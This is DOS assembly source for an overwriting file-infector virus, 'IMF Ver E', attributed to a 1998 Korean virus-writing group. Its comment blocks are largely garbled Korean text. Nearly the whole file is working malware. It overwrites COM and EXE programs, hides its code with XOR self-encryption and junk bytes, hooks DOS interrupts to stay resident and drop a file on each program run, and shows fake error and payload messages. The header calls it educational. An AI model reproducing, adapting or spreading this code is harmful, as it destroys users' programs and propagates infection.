;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     IMF (Ver E)                             \          \     \   \
;                  by MOV of SVS              \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : IMF (Ver E)
; AV Name    : Miny1
; Author     : MOV (Master Of Virus)
; Group      : SVS (Seoul Virus Society)
; Origin     : Corea
; Date       : 1998/02
;
; Type : Non memory Resident COM,EXE  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �i�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;--------------------------------------------------------------------------
;       �e�w�a�A�a? ��a�� �i�i�a�A�a.             MOV
;       �� ���a ���� ���� �e�i�a�� Ж�e�A
;       ���╡ �A���� ���a�e �e�e�����i ��Ё ���i�i �s���a.
;       ���a����a�i ����1.�e�w���a�� ���e�a�ኅ�a.
;       ���e E�w�����a. B�w�� E�w�� �i�e ���ኅ�a.
;       ����1�e�w���e �����h�� �W�wӡ ������ �a���s���a.
;       ����1�� ���a�a�e�� �������a�s���a.
;       ���b���e �a�q�e �����a�e ���� �a�a�a�e�� �i�󓡔a.
;--------------------------------------------------------------------------
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

parasize     equ (vend - start+0fh+256) shr 4   ; �w���i �a��

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                jumps                           ; �ᥡ��Q�e�� �w�w��

                org     100h


start:           call    passw                  ; �qѡ��
                nop                             ; �e�e�e �eˡ ���ዷ
                mov     si,9999h
                nop
                nop
start2:
                dec     si
                cmp     si,0 
                jne     start2                  ; 0�� �a���e ��΁�a�a
                mov     ah,(2ah xor 72h)        ; �i�a ���� ���� 31�����e
                call    xorp                    ; �A���� �b
                cmp     dl,31
                je      virmm
start3:
                push    ax                      ; AX,Bx,CX,DX ��w
                push    bx
                push    cx
                push    dx
                mov     ah,(4eh xor 72h)        ; �� �弁 �a���i �x�e�a
                mov     dx,offset comfiles      ; COM �a��
                xor     cx,cx                   ; �����e ���e
                call    xorp
again:
                jc      memt
                
                mov     ax,DS:[80h+1eh]         ; ���a�i ���a
                cmp     ax,'IW'                 ; �啡�� �a�����a?
                je      next                    ; �x�a�e ��΁
                cmp     ax,'OC'
                je      next                    ; COMMAND �a�����a �x�e�e ͡��
                mov     ah,(43h xor 72h)        ; ����Ё�A
                mov     al,01h
                xor     cx,cx
                mov     dx,80h+1eh
                call    xorp
                mov     ah,(3dh xor 72h)        ; �a���i �e�a
                mov     al,02h
                call    xorp
                xchg    ax,bx                   ; �a��Ѕ�i�t�i bx�A..
                mov     ah,(3fh xor 72h)        ; 3�a���a�i ���ᵥ�a
                mov     dx,offset oldbyte
                mov     cx,3
                call    xorp
                lea     si,oldbyte              ; call �w�w���e ��΁�e�a ����
                cmp     byte ptr [si],0e8h      ; �q�q���a�a��.
                je      next
                mov     al,02                   ; �a�� �{�a��...
                xor     cx,cx
                xor     dx,dx
                mov     ah,42h
                int     21h
                or      dx,dx                   ; 64000�a���a���a �a�e �a�e�a
                jnz     next                    ; ���i.
                mov     al,00                   ; �a�� ��q�a��..
                xor     cx,cx
                xor     dx,dx
                mov     ah,(42h xor 72h)
                call    xorp
                mov     ah,2ch                  ; ���e ���ᵥ�a.
                int     21h
                mov     byte ptr gaza1,dl       ; �a�a �t�i ��w�e�a
                mov     byte ptr gaza2,dl
                mov     byte ptr gaza3,dl
                mov     byte ptr gaza4,dl
                mov     byte ptr gaza5,dl
                mov     byte ptr gaza6,dl
                mov     byte ptr gaza7,dl
                mov     byte ptr gaza8,dl
                mov     byte ptr gaza9,dl
                mov     byte ptr gaza10,dl
                mov     byte ptr gaza11,dl
                mov     byte ptr gaza12,dl
                mov     byte ptr gaza13,dl
                mov     byte ptr gaza14,dl
                mov     byte ptr gaza15,dl
                mov     byte ptr gaza16,dl
                mov     byte ptr gaza17,dl
                mov     byte ptr gaza18,dl
                mov     byte ptr gaza19,dl
                mov     byte ptr gaza20,dl
                mov     byte ptr keygab,18h     ; 18h�� �qѡ�� �e�a
                call    okw                     ; �a����a�i �e�a.
                mov     ah,(3eh xor 72h)        ; �a���i �h�e�a
                call    xorp

next:
                mov ah,3eh                      ; �����a �� ��h�e�a
                int 21h
                mov ah,(4fh xor 72h)            ; �a�q �a���i �x�e�a
                call xorp
                jmp again

virmm:
                mov ah,(9 xor 72h)              ; �A�A�� �b
                mov dx,offset virm
                call xorp
                mov ah,4ch                      ; �a���{����
                int 21h

memt:           cmp     di,1                    ; di �a 0���e EXE �a���i �q�q
                je      nextokok                ; ��ǥ�a.
                mov     ah,4eh
                mov     dx,offset exefiles
                mov     cx,0
                int     21h
                mov     di,1
                jmp     again

nextokok:       mov     ax,3524h                ; ������a24�巁 ��á�i ���ᵥ�a
                int     21h
                mov     word ptr int24x2[0],bx  ; ���a�U�t��w
                mov     word ptr int24x2[2],es  ; �A�a���a�廡�t ��w
                mov     ax,2524h                ; ������ ������a 24��
                mov     dx,offset int24x1
                int     21h
                mov     ah,(35h xor 72h)        ; ������a 2�巁 ��á�i ���ᵥ�a
                mov     al,21h
                call    xorp                 
                mov     word ptr oldint[0],bx   ;�b�� �a�e�a���� ��w
                mov     word ptr oldint[2],es
                mov     ax,offset int_21h_entry ; �w���a�� ��a
                cmp     bx,ax
                je      loc_4
                
                mov     ah,(25h xor 72h)        ; ������ ������a 21��
                mov     al,21h
                mov     dx,offset int_21h_entry
                call    xorp
                             
                mov     ah,(9 xor 72h)          ; �a�w�a�i ������ ���e �A�A��
                mov     dx,offset virmsg
                call    xorp
                mov     ax,2524h                ; ������ ������a 24�� �a�� ��
                mov     dx,offset int24x2       ; �a���a.
                int     21h                       
                mov     byte ptr keygab,0       ; �qѡ�� �t�A�a 0�i ���ẅ�a.
                mov     ah,(31h xor 72h)        ; �A���� �w�� �a�� ���a
                mov     dx,parasize
                call    xorp
loc_4:
                mov ah,(9 xor 72h)              ; ��� �a�e�a��
                mov dx,offset virmsg
                call xorp
                mov ax,2524h
                mov dx,offset int24x2
                int 21h
                int 20h

int_21h_entry:
                cmp     ah,4bh                  ; ��З���a?
                jne     loc_5
                push   ds
                push   ax
                push   bx
                push   cx
                push   dx
                push   si
                push   di
                push   cs
                pop    ds
                mov     ax,3524h                ; �A���� �w���e�wȁ�A�� 24��i
                int     21h                     ; �a�����a.
                mov     word ptr int24x2[0],bx
                mov     word ptr int24x2[2],es
                mov     ax,2524h
                mov     dx,offset int24x1
                int     21h
                mov     ah,(3Ch xor 72h)        ; �a�� ����
                mov     cx,2               
                mov     bx,5             
                mov     dx,offset data_5
                call    xorp                   
                mov     ah,(40h xor 72h)        ; �a����a�i �e�a
                mov     cx,offset vend - start
                mov     dx,100h
                call    xorp
                mov     ah,(3Eh xor 72h)        ; �a���i �h�e�a
                mov     bx,5
                call    xorp
                mov     ax,2524h                ; ��24�� ����
                mov     dx,offset int24x2
                int     21h
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax             
                pop     ds
 loc_5:
                jmp     dword ptr cs:oldint     ; ���� ������a 21��a�� ��΁
int24x2 dd ?
int24x1:
                xor ax,ax
                xor bx,bx
                xor cx,cx
                xor dx,dx
                iret
xorp:
                xor ah,72h
                int 21h
ret
data_5          db      'MEM.COM', 0
virmsg          db      'Incorrect DOS version',0ah,0dh,'$'
oldint          dd ?
comfiles        db '*.C?M',0          
exefiles        db '*.E?E',0
oldbyte         db 0cdh,20h,90h                 ; 3�a���a
newmsg:
virm db ' SVS/COREA Made by MOV(Master Of Virus)',0ah,07h,0dh ;�e�e�� MOV
     db '[IMF Virus] Ver.E (VCL.5249???-> FK2.B)',0ah,07h,0dh
     db '(qnstjr gkffuaus Eht qkfhgo)<--- Hangul',0ah,07h,0dh,'$'
endmsg:                                         ; �qѡ�� / �a���A �ẁ�e ����
keygab          db ?
okw:
jmp okok1
gaza16          db ?
okok1:
call passw
                jmp okok2
gaza17          db ?
okok2:
                mov al,40h
                jmp okok3
gaza18 db ?
okok3:
                xchg ah,al
                jmp jok1
gaza8 db ?
jok1:
                mov cx,offset vend - start
                jmp okok4
gaza19 db ?
okok4:
                mov dx,100h
                jmp okok5
gaza20 db ?
okok5:
                int 21h
                jmp jok2
gaza9 db ?
jok2:
                call passw
                ret
passw:
                jmp jojo
gaza10 db ?
jojo:
                mov si,103h
                jmp jok3
gaza1 db ?
gaza15 db ?
jok3:
                mov di,103h
                jmp jok4
gaza2 db ?
gaza14 db ?
jok4:
                mov ah,keygab
                jmp jok5
gaza3 db ?
gaza13 db ?
jok5:
                mov cx,offset endmsg - 103h
                jmp mloop
gaza12 db ?
mloop:
                lodsb
                jmp jok6
gaza4 db ?
jok6:
                xor al,ah
jmp jok7
gaza5 db ?
jok7:
                stosb
                jmp jok11
gaza11 db ?
jok11:
                jmp jok8
gaza6 db ?
jok8:
                loop mloop
                jmp jok9
gaza7 db ?
jok9:
                ret

vend:
seg_a           ends

; FK2 �a����a�A�� ���� �����w COM EXE�i �奡�v�a
; �e�e�e XOR �qѡ����.
; �e�A ����1 �e�w���a�� �i�a�� �ᢁ ������ �a�a�a
; ��i ���e �i�V���e ����a���� �qѡ���e �e��e ���{��
; �A���� �w�� COM EXE �q�q�w�� �a�a�a ���� ����1�e �A���� �w���i �e�e�a
; �a���A �A�����A�� �sӡ�e�� ����1�a�� �s�ኅ.
; ���i ���� �a�a�a ����1�� MEM.COM �a���i �e�a�q?
; �a���a�� �i�� MINY1.? ---> IMF Virus�� �a������ �a�e�a...
                end     start

